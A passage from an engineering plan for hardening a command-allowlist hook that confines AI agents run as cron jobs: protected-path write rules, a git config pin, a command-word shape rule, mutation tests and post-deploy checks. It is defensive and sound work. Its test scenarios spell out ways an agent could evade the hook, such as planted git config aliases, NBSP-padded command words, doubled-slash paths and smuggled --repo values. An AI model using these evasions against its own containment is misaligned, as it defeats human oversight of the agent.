    detection: "in-surface: git skips a missing or unreadable global config silently, so git's stderr does NOT name the file. Commits then fail with 'Author identity unknown'. The chokepoint probe agentGitConfigReadable() reports op cron-git-config-pin through reportSilentFallback once per process. The image build fails first if the file is absent (Dockerfile:165)"
    alert_route: "Sentry issue (op cron-git-config-pin) + heartbeat ok:false"
  - mode: "a planted XDG ~/.config/git/ignore or attributes survives the pin (residual G3)"
    detection: "in-surface: the chokepoint probe xdgGitResidualPresent() reports op cron-git-xdg-config-present through reportSilentFallback on the absent-to-present transition"
    alert_route: "Sentry issue (op cron-git-xdg-config-present)"
  - mode: "a new cron or spawn site drops the pin"
    detection: "pre-merge: cron-spawn-git-config-pin.test.ts rows 2, 4 and 4c go red on the PR that adds it, with a message naming the file and the fix"
    alert_route: "CI failure on that PR"
  - mode: "quiet failure: an agent loops on a denied step and reports success with no artifact"
    detection: "resolveOutputAwareOk for artifact-producing crons; the bot-fix / filing run report"
    alert_route: "the cron's run report and heartbeat"
logs:
  where: "pino logger in the web-platform container, shipped to Better Stack by the Vector journald shipper; the hook writes no logs (stdout is the hook protocol). New Sentry ops: cron-git-config-pin and cron-git-xdg-config-present (error, reportSilentFallback, transition-latched) and cron-containment-new-rule-deny (warning, warnSilentFallback, tags cron and rule, at most one per run per rule; never the command or path)"
  retention: "Better Stack plan retention; Sentry plan retention for errors; nothing new is retained"
discoverability_test:
  command: "node -e 'process.stdout.write(require(\"node:child_process\").spawnSync(process.execPath,[\"apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs\",\"/dev/null\"],{input:JSON.stringify({tool_name:\"Write\",tool_input:{file_path:\"/home/soleur/.gitconfig\",content:\"x\"}}),encoding:\"utf8\"}).stdout)'"
  expected_output: "protected-path write"
```

The command contains none of Check 10's shell-active bytes (`|`, `;`, `&`, `<`, `>`, `$`, backtick). It was run on
2026-11-16 under `env -i PATH=/usr/local/bin:/usr/bin:/bin` against main and printed the `allow` decision, which is
the pre-fix RED. After Phase 1 it must print a deny whose reason contains `protected-path write` (AC1). It checks the
committed hook offline and needs no credentials. `/dev/null` as the allowlist file loads as an empty allowlist, not as
deny-all, so the Write branch is reached.

**Affected-surface note (2.9.2):** the cron worker is a surface nobody can inspect directly. The in-surface signals
are the hook's own reason text, which separates the competing explanations for a denied step (protected path,
git-verb rule, irregular command word) in one event, and git's own stderr, which names a broken
identity file. Delivery of the pin into the spawned process is proven before merge by behavioural rows 1 and 3 and
by real-git row 5. Production HOME writability is not measured (brief: "not checked live").

## Architecture Decision (ADR/C4)

### ADR

Amend ADR-033 with a dated amendment (Phase 4). No new ADR.

### C4 views

**No C4 impact, with the basis enumerated.** A read-only agent read all three files in full (`model.c4` 1113 lines,
`views.c4` 151, `spec.c4` 54) against the change.

- External human actors: `founder`, and `publicReader` via `github -> publicReader` (`model.c4:988`). Both are
  already modelled, and the change adds none. `contributor` (`:123`) is unrelated.
- External systems: `github` (the git remote, `:423`), `anthropic` (`:415`), `doppler` (`:450`),
  `platform.infra.inngest` (`:357`) and `platform.infra.hetzner` (`:349`). All are already modelled.
- Stores and containers: `platform.infra.workspacesVolume` (`:353`), `platform.infra.gitDataStore` (`:395`),
  `platform.plugin.kb` (`:208`) and `platform.engine.claude` (`:156`). All are already modelled. The image-owned
  identity file is a file inside the api container, not an element.
- Access relationships: none changes. The `api -> kb` edge (`:754`) is silent on spawn env. The `:141`/`:314`
  `buildSpawnEnv` sentences concern `SOLEUR_DISABLE_*` overrides and stay true. The `:193` `filingShape` mirror claim
  concerns the corpus, not whitespace, and stays true.
- No description is falsified, and no edge-prose count moves.
- `bash plugins/soleur/test/c4-count-parity.test.sh` ran green on 2026-11-16 (13 passed, 0 failed).

### Sequencing

The ADR amendment lands in this PR and describes the state the PR creates. No soak gate.

## Guard Contract

### Guard 1 — git global config write-protection

**Coverage (CTO H6).** The hook is registered only by `setupEphemeralWorkspace`, which writes `.claude/settings.json`
through `buildCronEvalSettings`, writes `cron-allow.txt` and runs `runHookSelfTest`. So Guard 1 covers every
workspace-spawned agent cron. Two crons spawn in the server cwd with no workspace and are unhooked: `cron-daily-triage.ts`
(`spawnCwd: process.cwd()`) and `cron-follow-through-monitor.ts`. Their live control is `--allowedTools`, quoted
from each cron's `CLAUDE_CODE_FLAGS`:
- daily-triage: `Bash(gh issue list:*),Bash(gh issue view:*),Bash(gh issue edit:*),Bash(gh issue comment:*),Read,Glob,Grep`
- follow-through-monitor: the same, plus `Bash(gh issue close:*),Bash(gh label create:*)`

Neither list admits Write, Edit or a git verb, and the pin still reaches both through `spawnClaudeEval`. No hook wiring
is added for them. The follow-up trigger is: if either cron gains a file or git verb, move it onto a workspace. The
`cron-containment-new-rule-deny` metric never fires for these two crons.

**Property.** No Write, Edit or MultiEdit call from a workspace-spawned cron agent succeeds on a path that ends in `.gitconfig`, that
lies in or at a `.config/git` directory, or that lies in or at the trust-root directory `/usr/local/share/soleur`
(which holds `AGENT_GIT_GLOBAL_CONFIG`), whatever the absolute, relative or doubled-slash spelling.

**Assembly.** The chokepoint is the single `case "Write": case "Edit": case "MultiEdit":` arm of `decide()`
(`cron-bash-allowlist-hook.mjs`, the `case "Write": case "Edit": case "MultiEdit":` arm), which tests `ti.file_path || ti.path` against `WRITE_PROTECTED_PATTERNS`. No
other arm handles those tools. `NotebookEdit` reaches the catch-all deny. A new write-capable tool class would also
reach the catch-all, which the existing "unrecognized tool classes deny" suite pins.

**Mutation matrix:**

| # | Mutation | Expected |
|---|---|---|
| 1 | Delete the `\.gitconfig` entry from `WRITE_PROTECTED_PATTERNS` | RED (all `.gitconfig` deny rows) |
| 2 | Delete the `\.config\/git` entry | RED (the `.config/git/*` rows) |
| 3 | Anchor the first entry as `/^\.gitconfig$/` (drops the `(^\|\/)` arm) | RED (the absolute and `../../` rows) |
| 4 | Change the second entry to `/\.config\/git/` without its boundary | RED (must-pass `/x/repo/.config/github/x.yml`) |
| 5 | Guard's own dispatch: make the Write/Edit arm test only `ti.path` (drop `file_path`) | RED (every row uses `file_path`) |
| 6 | Second member: protect `.gitconfig` for `Write` only by special-casing `tool === "Write"` | RED (the Edit and MultiEdit rows) |
| 6b | Drop the `posix.normalize` arm (test the raw path only) | RED (the three normalisation rows) |
| 7 | Third member: delete the `usr\/local\/share\/soleur` entry | RED (the `AGENT_GIT_GLOBAL_CONFIG` drift row) |
| 8 | Drift: change `AGENT_GIT_GLOBAL_CONFIG` in `host-git.ts` to another directory without updating the hook | RED (the drift row imports the constant, not a copy) |
| 9 | Drop the trailing `(\/\|$)` boundary from the trust-root entry | RED (must-pass `/usr/local/share/soleurx/y`) |

**Harness rows.** Suite mutation: replace the row helper's `tool_name` with a constant `"Read"`. RED, because every
deny row would then hit the secret-path reason, not the protected-path one. The rows assert the reason prefix, not
just `deny`. Must-pass inputs that are not the canonical path: `.gitconfig.example`, `docs/gitconfig.md`,
`.config/github/x.yml`, `apps/.gitconfig-notes` and `/usr/local/share/soleurx/y`. Each must stay allowed, so a guard
that denies everything goes red.

### Guard 2 — git/gh command words are plain

**Property.** No Bash segment whose first command word normalises to `git` or `gh` is admitted unless its raw command
words (git: positions 0-1; gh: 0-2, or 0-1 for `gh api`) are exactly the plain words the allowlist matched. So every
git/gh rule that reads raw positional tokens sees the command the allowlist admitted.

**Assembly.** The chokepoint is one call to `commandWordShapeReason(tokens)` in `decide()`'s Bash segment loop, ahead
of every raw-position reader: `gitVerbReason(tokens)`, the `gh api` branch that calls `hasDotSegment`, and the filing
gate (`filingShape`/`filingJustificationReason(`). `segmentMatchesAllowlist` (the `const allowlisted` line) already
reads the normalised view. Every segment passes through that loop, because `splitSegments` feeds it and the metachar
gate comes before it. The positions are fixed because every git/gh line in `CRON_BASH_ALLOWLISTS` has the form
`git <sub>`, `gh <group> <verb>` or `gh api <path>`. This was checked on 2026-11-16 across all 22 distinct git/gh
lines. The allowlist census row keeps it true: a future flag-led line would be denied by the shape rule, and the row
would go red with a message that says what to extend.

**Mutation matrix:**

| # | Mutation | Expected |
|---|---|---|
| 1 | Delete the `commandWordShapeReason` call from `decide()` | RED (every irregular row) |
| 2 | Guard's own dispatch: compute `verb` from raw `tokens[0]` instead of the normalised first word | RED (the `git <verb>` verb-table rows and `'' git checkout`) |
| 3 | Check position 0 only (drop 1) | RED (the empty, padded and NBSP-before-sub verb-table rows) |
| 4 | Second member: check git but return `null` for gh | RED (the four irregular gh rows) |
| 5 | Third position: for gh check only 0-1 | RED (`gh issue ' create' …`) |
| 6 | Drop the flag branch (flag words fall through to the regex, which admits `-`) | RED (the two flag-reason rows) |
| 7 | Run the rule on the first segment only, outside the segment loop | RED (`git status ; git ' push' …`) |
| 8 | Make the rule deny every git/gh command | RED (the allowlist census row and the must-pass rows) |
| 9 | Hint: always `gh <group> <verb>` | RED (the `gh ' api'` hint assertion) |

**Harness rows.** First suite mutation: build the irregular rows with plain single spaces. RED, because the per-segment
anti-vacuity assertion fails. Second suite mutation: drop `cron-bug-fixer` from the verb table. RED, because of the
assertion that the table's allowlist set equals the two named crons. The must-pass inputs that are not the canonical
case are:
- the allowlist census
- `git commit -m "use -a flag"`
- `gh issue list --label "a b"`
- the honest multi-word filing

### Guard 3 — cron spawn env git-config pin census

**Property.** Every child process a cron function starts that can run git (`git`, `gh`, `bash`, `claude`) carries
`GIT_CONFIG_GLOBAL = AGENT_GIT_GLOBAL_CONFIG` (or `/dev/null`) and `GIT_CONFIG_NOSYSTEM = 1`, and no caller env can
override them. With that pin, config in a planted `$HOME/.gitconfig` is never read. The XDG `ignore`/`attributes`
defaults are a recorded residual that Guard 1 covers.

**Assembly.** There are two runtime chokepoints: the `spawnClaudeEval` env literal (every agent cron) and `spawnSimple`
(substrate git and event-ship-merge). Beyond them, the members are:
- every `HOME`-keyed env literal under `server/inngest/**`: 26 today, in 23 files
- every call whose first argument is the literal `"git"`, whatever the callee (`spawn`, `execFileP`, `runProc`,
  `spawnSimple`): 16 call sites in 15 `{file, function or step}` pairs today
- every `"gh"`/`"bash"` first-argument literal, which must carry an explicit pinned env (row 4c)

A site with no `HOME` key and no such literal is listed in `GIT_CAPABLE_LITERAL_EXCLUSIONS` with a reason. The node
self-test probes are excluded by name. One residual remains: a spawn whose command comes from a non-literal
expression (`spawn(cmdFromConfig, …)`). ADR-033 records it, and the Phase 6 review checks for it.

**Mutation matrix:**

| # | Mutation | Expected |
|---|---|---|
| 1 | Remove `...CRON_GIT_CONFIG_PIN` from `cron-roadmap-review.ts`'s `buildSpawnEnv` | RED (row 2, with a message naming the file) |
| 2 | Move the spread to the FIRST entry of a literal, so later keys could override it | RED (row 2 "last element") |
| 3 | Delete the pin from the `spawnClaudeEval` env spread | RED (row 1) |
| 4 | Change `spawnSimple` to `env: opts.env ?? { ...process.env, ...CRON_GIT_CONFIG_PIN }` (pins only the no-env case) | RED (row 3, override case) |
| 5 | Guard's own dispatch: the sweep's file filter matches nothing (wrong directory) | RED (the `KNOWN_HOME_LITERALS` and `KNOWN_GIT_SPAWNS` diffs) |
| 6 | Second member: a new `HOME:` literal added in a second file without the pin | RED (row 2 per-site check and map diff) |
| 7 | Revert `cron-strategy-review.ts:127` to no env | RED (row 4) |
| 7b | Revert the `cron-github-cidr-refresh.ts` clone (`setupEphemeralWorkspace`) to no env | RED (row 4; the callee-agnostic matcher sees `runProc`) |
| 7c | Rewrite the strategy-review clone as `const GIT = "git"; spawn(GIT, …)` without the pin | RED (row 4c) |
| 7d | In a `spawnGit` helper, put `...opts` after `env` | RED (row 4 order check) |
| 7e | Add `spawn("gh", ["pr", "list"])` with no env in a cron file | RED (row 4c) |
| 8 | Retype the path literal in a cron file instead of importing it | RED (row 4b) |
| 9 | Replace the pin value with a fake `GIT_CONFIG_GLOBAL: "/tmp/x"` in `host-git.ts` | RED (row 0) |
| 10 | Property: drop `GIT_CONFIG_GLOBAL` from the constant (keep NOSYSTEM) | RED (row 0 and real-git row 5: `planted` is read, `H/fired` exists) |
| 11 | Remove the `agentGitConfigReadable` call from one chokepoint | RED (substrate-exit row 6 wiring) |
| 12 | Make the latch once-per-process (never re-arm) | RED (row 6 wiring, second-report case) |
| 13 | In one `spawnScriptCapture` helper, revert to `env: opts.env` | RED (row 4c, `bash` with an unpinned env) |
| 14 | Make `withCronGitConfigPin` a bare last spread | RED (row 6, the `/dev/null`-kept case) |
| 15 | Add `const CRON_GIT_CONFIG_PIN = {}` locally in a cron file and spread it | RED (binding check: it resolves to a local, not the import) |
| 16 | Add `env.GIT_CONFIG_GLOBAL = "/tmp/x"` after a pinned literal | RED (row 4d) |

**Harness rows.** Suite mutation (a): make row 5's pinned arm reuse the control env. RED, because `planted` is read
and `H/fired` exists. Suite mutation (b): make the AST walk return no object literals. RED, because the
`KNOWN_HOME_LITERALS` diff then reports all 23 files missing. Must-pass inputs that are not canonical:
- the `/dev/null` sites (`gitIsolatedEnv`, `spawnGitCapture`, `GIT_HARDENING_ENV`)
- `withCronGitConfigPin(opts.env)` in the four bash helpers, and the one-hop `ghEnv`/`buildSpawnEnv(...)` resolution
- the named `_cron-safe-commit` `extraEnv` exception
- `spawnSimple("git", …)` calls, which pass through the chokepoint
- the shorthand `{ HOME }` form, if one appears

**Anchor.** Two stored maps guard this: `KNOWN_HOME_LITERALS` (23 files, 26 sites) and `KNOWN_GIT_SPAWNS` (15 pairs),
plus the `GIT_CAPABLE_LITERAL_EXCLUSIONS` list. One diff can edit both the guarded code and the stored maps, so the
maps prove consistency, not integrity. A weakening passes only if two things outside that diff also move. First, the
Phase 6 review round: its security-sentinel seat is told that any shrink of a stored map, or any new exclusion, is a
finding. Second, the `git diff origin/main` of the maps, which the PR body prints. The maps are per-file, so a
substitution that keeps the total still goes red on the file that changed.

## GDPR / Compliance Gate

**This is not legal review. Findings are heuristic. Consult `soleur:legal:clo` + `soleur:legal:legal-compliance-auditor` before merging.**

`soleur:gdpr-gate` ran at plan Phase 2.7, triggered by condition (b): a `single-user incident` threshold. The
canonical regulated-data regex matched none of the paths the plan names
(`gdpr-gate: path scan complete — 14 examined, 0 matched`). The corpus is 21 days since `last-verified`, so no
staleness banner fired. None of the five v1 checks fired: no schema column, no PII table, no FK to `users`, no new
vendor or SDK, and no Art. 9 column. The change processes no personal data. It moves a git config location and
tightens a tool-call filter, and the git identity it pins is a bot identity. No Critical finding, and nothing to
escalate.

## Open Code-Review Overlap

None. 96 open `code-review` issues were checked against every planned path (hook, host-git, substrate, the 25 cron
files, both extended tests, the new test, and ADR-033), and none names any of them.

## Domain Review

**Domains relevant:** Engineering

### Engineering

**Status:** reviewed
**Assessment:** the CTO agent ruled the binding scope before planning, and ruled technical forks during planning
(F-A through F-H, then A1-A3 on the advisor's challenges; see `decision-challenges.md`). Main corrections: the
population is larger than the `HOME:` grep (Class C git helpers that pass no env); the git/gh rules keep reading raw
tokens and an irregular command word is denied outright (A1, which supersedes F-D, F-E and F-H and so avoids both the
`--repo "origin evil"` regression and the commit-message over-deny); the per-literal spreads stay alongside the
chokepoints (A2 rejected); and the identity file's directory is write-protected (A3).

### Product/UX Gate

Not applicable. No UI surface: no `components/**`, `app/**/page.tsx` or `app/**/layout.tsx` in either file list.
Product was not flagged in the sweep. The CPO took part only as the plan-time sign-off that the `single-user incident`
threshold requires ("approved with conditions", folded into User-Brand Impact).

Other domains (Legal, Marketing, Operations, Finance, Sales, Support): no implications. No user data, no copy, no
vendor, no spend.

## Scope Check

### Ask Mapping

| # | User ask (verbatim) | Plan item | Status |
|---|---------------------|-----------|--------|
| 1 | [issue #12757] "Add `(^\|\\/)\\.gitconfig$` and `(^\|\\/)\\.config\\/git(\\/\|$)` to `WRITE_PROTECTED_PATTERNS`." | Phase 1.1; Guard 1; AC1, AC2 | mapped |
| 2 | [issue #12757] "Pin `GIT_CONFIG_GLOBAL` in every cron spawn env, matching the set in `server/agent-env.ts`. Point it at `/usr/local/share/soleur/agent.gitconfig`, not `/dev/null`, so the fallback commit identity survives. Add `GIT_CONFIG_NOSYSTEM` only if `agent-env.ts` already sets it." | Phase 2; census table; AC3-AC5 | mapped (the `GIT_CONFIG_COUNT` part of "the set" is descoped per the brief's OUT list) |
| 3 | [issue #12757] "In `gitVerbReason`, derive the subcommand and args from `normalizeSegmentWhitespace(tokens.join(\" \")).split(\" \")`." | Phase 1.2 (replaced by CTO A1, which amends binding IN item 4: a fail-closed command-word shape rule makes the raw and normalised views agree, so `gitVerbReason` keeps reading raw tokens and the `--repo "origin evil"` regression cannot open) | mapped |
| 4 | [issue #12757] "Add test rows for empty, padded and NBSP-led subcommand tokens. Cover checkout, switch, push, add and commit, on both the roadmap-review and bug-fixer allowlists." | Phase 3.3; Guard 2; AC6 | mapped |
| 5 | [issue #12757] "Give the fix its own review round." / [brief] "Separate review round before merge." | Phase 6; AC12 | mapped |
| 6 | [brief] "Add a test that fails if any cron spawn env lacks the pin, so a new cron cannot drop it." | Phase 3.1-3.2; Guard 3; AC7 | mapped |
| 7 | [brief] "the plan must enumerate all of them from a grep, not a sample." | Research Insights census table; Files to Edit | mapped |
| 8 | [brief] "import it; do not retype the path /usr/local/share/soleur/agent.gitconfig" | Phase 2.1, 2.6; row 4b | mapped |
| 9 | [brief] "Also set GIT_CONFIG_NOSYSTEM=1 (server/agent-env.ts already sets it)." | Phase 2.1 | mapped |
| 10 | [brief] "Check whether Write/Edit tools are gated by SECRET_PATH_PATTERNS too before concluding the gap" | Research Reconciliation row 5; Overview reproduction | mapped |
| 11 | [brief] "The PR body says \"assumed writable per the Dockerfile and deploy flags; not checked live\"." | Overview; AC13 | mapped |
| 12 | [brief] "At most one PR." | Split Assessment | mapped |

Note on row 2: the issue's "matching the set in `server/agent-env.ts`" would include the `GIT_CONFIG_COUNT`
`safe.bareRepository` pair. The binding brief's OUT list ("GIT_CONFIG_COUNT / safe.bareRepository pins") excludes
it. The brief wins, so the pin is the two keys the issue names explicitly.

### Plan-Item Provenance

| Plan item | User words cited (verbatim quote) | Verdict |
|-----------|-----------------------------------|---------|
| `cron-bash-allowlist-hook.mjs` 1.1 | asks 1 | asked |
| `cron-bash-allowlist-hook.mjs` 1.2 (git positions) | asks 3, 4 | asked (form per CTO A1) |
| `cron-bash-allowlist-hook.mjs` 1.2 (gh positions) | — | inferred — justification: CTO A1. The `gh api` branch and the filing gate read raw positions the same way; leaving gh out would keep P4 false for gh. |
| `cron-bash-allowlist-hook.mjs` 1.1 `posix.normalize` arm | — | inferred — justification: spec-flow plan-review finding; the `.config/git` and trust-root patterns are not end-anchored, so `.config//git/config` evaded them. It can only add denies. |
| `agentGitConfigReadable` probe + chokepoint report (2.1, 2.2) | — | inferred — justification: CTO G2; `cq-silent-fallback-must-mirror-to-sentry`. git skips a missing global silently. |
| ADR-287 cross-reference line, framing-test comment | — | inferred — justification: CTO G1; A1 makes the existing text false. |
| Census rows 4c (gh/bash), 5b, 6 | — | inferred — justification: CTO G5, G3, G2. |
| `classifyNewRuleDeny` + `countNewRuleDenials` telemetry (2.6b), row 7 | — | inferred — justification: CTO H3; the deny reason never leaves the host, so without it the over-deny success metric is unmeasurable (`hr-observability-as-plan-quality-gate`). |
| `xdgGitResidualPresent` probe | — | inferred — justification: CTO H4; a pre-merge planted XDG file survives the pin and Guard 1. |
| `withCronGitConfigPin` + the four bash-helper pins, binding check, row 4d, `test/setup-node.ts` mock | — | inferred — justification: CTO H5, H1; name-matching censuses and an unseamed host probe were review-found false negatives and red suites. |
| `bot-fix/attempted` detection and the revert label line | — | inferred — justification: CTO H2; an over-deny's lasting effect outlives a revert. |
| `cron-bash-allowlist-hook.mjs` 1.1 trust-root entry | — | inferred — justification: CTO A3. The pin makes `AGENT_GIT_GLOBAL_CONFIG` the one file every cron git process reads; P7. |
| Deny-reason recovery hint (1.2) | — | inferred — justification: CPO sign-off condition (an agent must be able to reword rather than loop) |
| `host-git.ts` `CRON_GIT_CONFIG_PIN` | asks 2, 8, 9 | asked |
| `_cron-claude-eval-substrate.ts` chokepoints | asks 2, 6 ("so a new cron cannot drop it") | asked |
| 23 `HOME:`-literal files | asks 2, 7 | asked |
| Class C helpers (`cron-strategy-review.ts`, `cron-compound-promote.ts`, and the `spawnGit` edits in 3 others) | asks 2 ("every cron spawn env") | asked — CTO F-B ruled these spawns are cron spawn envs |
| `cron-content-vendor-drift.ts` `env?` removal (2.5) | — | inferred — justification: CTO F-A note. A caller env must not override a `/dev/null` pin; same property P2. Removing the parameter enforces it by construction. |
| `cron-spawn-git-config-pin.test.ts` | asks 6 | asked |
| Real-git row 5 | — | inferred — justification: learning 2026-10-15 (a census that only reads source cannot see an env that never reached the process); it is the only row that tests P2 itself |
| `cron-claude-eval-substrate-exit.test.ts` rows 1, 3 | asks 6 | asked |
| `cron-bash-allowlist-hook.test.ts` rows | asks 1, 4 | asked |
| ADR-033 amendment | — | inferred — justification: `wg-architecture-decision-is-a-plan-deliverable` (a new cross-cutting invariant every cron spawn must honor); CTO F-F placed it |
| Separate review round | asks 5 | asked |

### Split Assessment

- Subsystems touched: 2 (`apps/web-platform`, `knowledge-base`).
- Planned files: 37 (36 edited, 1 created), plus one conditional mock fix. Estimated changed lines: about 700:
  - the hook: about 40 lines
  - the pin, the probe and the chokepoints: about 35
  - the 25 cron files: about 70 (an import plus one spread each, the opts-type trims)
  - the hook tests: about 170
  - the new AST census test: about 300
  - the deny-marker telemetry and its test: about 60
  - the probes, `withCronGitConfigPin` and the shared mock: about 30
  - the substrate-exit rows: about 50
  - ADR-033 and ADR-287: about 30
- Thresholds: >= 4 subsystem roots OR > 25 planned files OR > 800 estimated lines.
- Recommendation: single PR. The file count is over the threshold, but the binding brief says "At most one PR". Most
  of the files are a mechanical import plus one spread. Splitting would ship the census with part of the population
  pinned, or the pin without the census that keeps it there. Either half alone leaves P2 or P3 false.

## Acceptance Criteria

<!-- founder-stated check: see plan-founder-check.md -->

### Pre-merge (PR)

- [ ] AC1: the `discoverability_test` command prints a deny containing `protected-path write`. Pre-fix it printed
  `"permissionDecision":"allow"`.
- [ ] AC2: every Guard 1 deny row and must-pass row in `cron-bash-allowlist-hook.test.ts` passes. Each deny row failed
  pre-fix (Phase 0 log in the PR body).
- [ ] AC3: census row 2 is green (every `HOME` literal ends with `...CRON_GIT_CONFIG_PIN`, and `KNOWN_HOME_LITERALS`
  matches), and Guard 3 mutation 1 applied locally turns it red with a message naming `cron-roadmap-review.ts`.
- [ ] AC4: `git grep -n "agent.gitconfig" -- apps/web-platform/server/inngest` returns nothing (row 4b). The path
  appears only in `host-git.ts` among server files.
- [ ] AC5: `git diff origin/main...HEAD -- apps/web-platform/server | grep -E '^\+.*(GIT_CONFIG_COUNT|safe\.bareRepository)'`
  prints nothing, and census row 0 asserts `CRON_GIT_CONFIG_PIN` has no `GIT_CONFIG_COUNT` key.
  `git diff --quiet origin/main...HEAD -- apps/web-platform/server/agent-env.ts apps/web-platform/Dockerfile` exits 0.
- [ ] AC6: the irregular-command-word battery passes.
  - The 40 verb-table rows (5 verbs × 4 forms × the roadmap-review and bug-fixer allowlists) and the 8 irregular
    single rows deny with `irregular command word in a (git|gh) command (word #N …)`.
  - The bare-`git` row reports `word #2 missing`, and the two flag-led rows give the flag reason.
  - The `gh ' api'` row's hint names `gh api <path>`.
  - The anti-vacuity and table-coverage harness assertions pass.
  - Three must-pass groups pass: the allowlist census (exact equality with the 22 stored lines), the raw-rule regression
    rows (`--repo "origin evil"`), and the must-pass rows (including `git commit -m "use -a flag"`).
  - Every irregular row either passed or was denied with a different reason before the fix (Phase 0 log).
- [ ] AC7: these rows pass:
  - `cron-spawn-git-config-pin.test.ts` rows 0, 2, 4, 4b, 4c, 4d, 5, 5b and 6, plus the binding check, its
    synthetic-source FAIL controls and the walk self-test
  - `cron-claude-eval-substrate-exit.test.ts` rows 1, 3 and 6, including the re-arm case
  - row 7, the new-rule telemetry and the `classifyNewRuleDeny` parity check
  - Row 5's control arm shows the fixture fires: `planted` is read and `H/fired` exists. Its pinned arm shows that
    neither happens.
  - Row 5b shows the XDG `ignore` residual and the hook's deny on that file.
- [ ] AC8: the existing suites stay green unchanged: the K1' rows, `cron-gh-output-framing-hook.test.ts`,
  `cron-claude-eval-substrate.test.ts`, every edited cron's own test, `host-git.test.ts`, `agent-env.test.ts`, and
  `dockerfile-git-version-floor.test.ts`.
- [ ] AC9: `cd apps/web-platform && ./node_modules/.bin/tsc --noEmit` passes.
- [ ] AC10: these mutation rows were applied locally, drove the suite RED, and were reverted:
  - at least three Guard 3 rows, including #5 (the dispatch row), #6 (the second-member row) and #7e (gh with no env)
  - at least three Guard 2 rows, including #2 (the dispatch row), #4 (the second-member row) and #5 (position 2)
  - Guard 1 rows #6b (normalisation) and #8 (drift)

  The PR body lists which rows ran.
- [ ] AC11: ADR-033 carries the dated #12757 amendment. It contains:
  - the I7(a) paths, including the trust-root directory and the normalised-path check
  - the pin invariant, scoped to git-capable children
  - the command-word shape rule
  - the residuals: the node probes, the XDG `ignore`/`attributes` files, the founder-workspace git spawns, a
    non-literal spawn command, and a flag-led allowlist line

  ADR-287's addendum item 2 carries the dated G1 cross-reference line.
- [ ] AC12: a `soleur:review` round ran after the implementation commits, separate from the work phase, with
  security-sentinel and user-impact-reviewer seats. Its findings are resolved or filed before merge.
- [ ] AC13: the PR body contains `Closes #12757` and `Ref #9601`, plus the sentence "Prod HOME: assumed writable per
  the Dockerfile and deploy flags; not checked live."

### Post-merge (read-only verification, automated by the next scheduled run)

- [ ] AC14 (read-only): this check can fail. In the first 48 hours after the deploy that carries the merge
  (start the window at the deploy, not the merge), two things must hold.
  - (a) Sentry has no `cron-git-config-pin` event. Query it read-only through the Sentry API for op
    `cron-git-config-pin`.
  - (b) For bug-fixer and roadmap-review, compare the Sentry `claude-eval-nonzero-nofix` event count, and the
    count of runs whose `detect-pr` step found no PR, with the prior two weeks. A rise is a fail to investigate.
    Bug-fixer stays green when it produces no PR and does not use `resolveOutputAwareOk`, so a self-report search
    cannot see it.

  - (c) (CTO H2) List issues labelled `bot-fix/attempted` after the deploy time, read-only:
    `gh issue list --state all --label bot-fix/attempted --search "updated:>=<deploy date>" --json number,title`.
    Join them to (a)/H3 events for `cron=cron-bug-fixer`. A fix-attempt comment quoting `cron-containment:` is a
    secondary signal only, because it is unverified that the agent's comment quotes the reason.
    Every joined issue goes on the revert runbook's operator-authorised label-removal line.

  As corroboration only, the next such PR's commits are authored by github-actions[bot]. That alone cannot fail,
  because the HOME global carries the same identity. Safe-commit crons are not evidence: they commit through
  `_cron-safe-commit.ts` `commit-tree` under the unchanged `/dev/null` `GIT_HARDENING_ENV`, so they print the bot name
  whether or not the pin works. Find the PR with `gh pr list --state all --limit 10 --json number,headRefName,createdAt`
  (a `bot-fix/` or roadmap-review head ref created after the deploy). Check the author with
  `gh pr view <N> --json commits --jq '.commits[].authors[].name'`, which must print `github-actions[bot]`. No cron is
  triggered by hand: the standing constraint is no prod writes, so the CPO's "trigger one cron" condition is met by
  observing the next scheduled run. If no agent-git run happens within 48 hours, record that in the PR thread. Part
  (a) still holds on any cron spawn, because every chokepoint call probes the file.

## Test Scenarios

- Given a cron agent, when it calls Write on `/home/soleur/.gitconfig`, then the hook denies with `protected-path
  write`. Unit.
- Given a cron agent, when it calls Write or Edit on `AGENT_GIT_GLOBAL_CONFIG`, then the hook denies with
  `protected-path write`. Unit.
- Given the roadmap-review or bug-fixer allowlist, when the agent runs `git ' checkout' --no-overlay HEAD:.claude apps`
  or `git\u00a0checkout …` (or any of the 40 verb-table forms), then the hook denies with the irregular-command-word
  reason naming the word's position. Unit.
- Given `gh ' api' repos/…/labels/../issues`, then the deny hint names `gh api <path>`. Given `gh -R o/r issue list`,
  then the reason is the flag reason. Unit.
- Given a Write to `/home/soleur/.config//git/config`, then the hook denies (normalised path). Unit.
- Given every git/gh line of every cron allowlist written with plain spaces, then none is denied by the shape rule.
  Unit (derived from `CRON_BASH_ALLOWLISTS`).
- Given `git push --repo "origin evil"`, when it is judged, then it stays denied. This is the regression for the
  normalised-only design. Unit.
- Given an honest commit `git commit -m "fix: a b c"` or `git commit -m "use -a flag"`, then it is allowed. Unit.
- Given an honest multi-word `--body` filing, then its verdict is unchanged. Given `gh ' issue' create`, then it is
  denied with the irregular-command-word reason. Unit.
- Given a `buildSpawnEnv` with `GIT_CONFIG_GLOBAL: "/tmp/evil"`, when `spawnClaudeEval` spawns, then the child env
  holds `AGENT_GIT_GLOBAL_CONFIG` and `GIT_CONFIG_NOSYSTEM=1`. Unit (mocked spawn).
- Given `spawnSimple("git", …)` with no env or an overriding env, then the spawn env carries the pin. Unit.
- Given an unreadable identity file, when either chokepoint spawns, then `reportSilentFallback` fires once with op
  `cron-git-config-pin` and the spawn proceeds. Unit.
- Given a HOME whose `.gitconfig` sets `user.name = planted` and a shell alias `probe`, when git runs with the pin,
  then `planted` is not read and the alias does not exist; without the pin both take effect. Integration (real git,
  local temp dirs, no network).
- Given `H/.config/git/ignore`, then git still honours it under the pin (the recorded residual), and the hook denies
  a Write to it. Integration plus unit.
- Given a new `spawn("gh", …)` with no env in a cron file, then census row 4c fails. Unit (static).
- Given a new `HOME:` env literal without the pin anywhere under `server/inngest/`, then census row 2 fails. Unit (static).
- Regression: every existing row in the five named suites stays green.

## Success Metrics

- Pre-fix RED and post-fix GREEN for the new rows (the Phase 0 log).
- **Primary (CTO H3):** count Sentry `cron-containment-new-rule-deny` events by `cron` and `rule` in the first week
  after the deploy. Any event on a command that a cron prompt prescribes with plain spaces is an over-deny, and it
  triggers the revert path. The metric cannot see `cron-daily-triage` or `cron-follow-through-monitor`, which are
  unhooked (Guard 1 coverage). The self-report query below is secondary only: `countPermissionDenials` keeps only the
  tool class, so a self-report body never carries the reason.
- Secondary: zero new FAILED self-reports attributable to a containment deny in the first week after merge. Check with a
